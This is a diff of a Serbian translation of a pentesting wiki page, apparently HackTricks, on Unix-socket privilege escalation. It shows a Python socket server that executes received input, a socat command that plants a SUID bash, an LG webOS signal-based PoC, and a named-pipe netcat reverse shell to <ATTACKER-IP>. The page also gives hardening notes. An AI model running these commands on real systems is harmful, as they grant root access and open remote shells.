@@ -4,7 +4,7 @@
 
 ## Primer vezivanja socket-a pomoću Python-a
 
-U sledećem primeru je **unix socket kreiran** (`/tmp/socket_test.s`) i sve što je **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete pronaći u stvarnom okruženju, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se upravlja unosom u najgorem mogućem slučaju.
+U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`) i sve što je **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovako nešto nećete pronaći u praksi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se obrađuje unos u najgorem mogućem slučaju.
 ```python:s.py
 import socket
 import os, os.path
@@ -39,15 +39,15 @@ echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat -
 ```
 ## Studija slučaja: eskalacija pokrenuta signalom preko UNIX socket-a u vlasništvu root-a (LG webOS)
 
-Neki privilegovani daemon-i izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane ulazne podatke i povezuje privilegovane radnje sa ID-jevima thread-ova i signalima. Ako protokol omogućava neprivilegovanom klijentu da utiče na to koji će native thread biti ciljan, možda ćete moći da pokrenete privilegovani code path i izvršite eskalaciju privilegija.
+Neki privilegovani daemoni izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane podatke i povezuje privilegovane radnje sa ID-ovima thread-ova i signalima. Ako protokol omogućava neprivilegovanom klijentu da utiče na to koji native thread je ciljan, možda ćete moći da pokrenete privilegovanu putanju koda i izvršite eskalaciju.<sup>[[1]](#references)</sup>
 
 Uočeni obrazac:
 - Povežite se na socket u vlasništvu root-a (npr. /tmp/remotelogger).
-- Kreirajte thread i pribavite njegov native thread ID (TID).
-- Pošaljite TID (packed) zajedno sa padding-om kao zahtev; primite potvrdu.
-- Pošaljite određeni signal tom TID-u da biste pokrenuli privilegovano ponašanje.
+- Kreirajte thread i pribavite njegov native thread id (TID).
+- Pošaljite TID (upakovan) zajedno sa padding-om kao zahtev; primite potvrdu.
+- Pošaljite određeni signal tom TID-u da pokrenete privilegovano ponašanje.
 
-Minimalni PoC nacrt:
+Minimalni PoC prikaz:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,17 +59,17 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Da bi se ovo pretvorilo u root shell, može se koristiti jednostavan obrazac named-pipe + nc:
+Da bi se ovo pretvorilo u root shell, može se koristiti jednostavan named-pipe + nc obrazac:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-Beleške:
-- Ova klasa grešaka nastaje usled verovanja vrednostima izvedenim iz stanja neprivilegovanog klijenta (TIDs) i njihovog povezivanja sa privilegovanim signal handlers ili logikom.
-- Ojačajte zaštitu enforcing credentials on the socket, validacijom formata poruka i odvajanjem privilegovanih operacija od eksterno prosleđenih identifikatora niti.
+Napomene:
+- Ova klasa grešaka nastaje usled verovanja vrednostima izvedenim iz neprivilegovanog stanja klijenta (TID-ovima) i njihovog povezivanja sa privilegovanim rukovaocima signala ili logikom.
+- Ojačajte sistem nametanjem provere akreditiva na socketu, validacijom formata poruka i odvajanjem privilegovanih operacija od eksterno dostavljenih identifikatora niti.
 
-## Reference
+## References
 
-- [LG WebOS TV Traversal putanje, zaobilaženje autentifikacije i potpuno preuzimanje uređaja (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
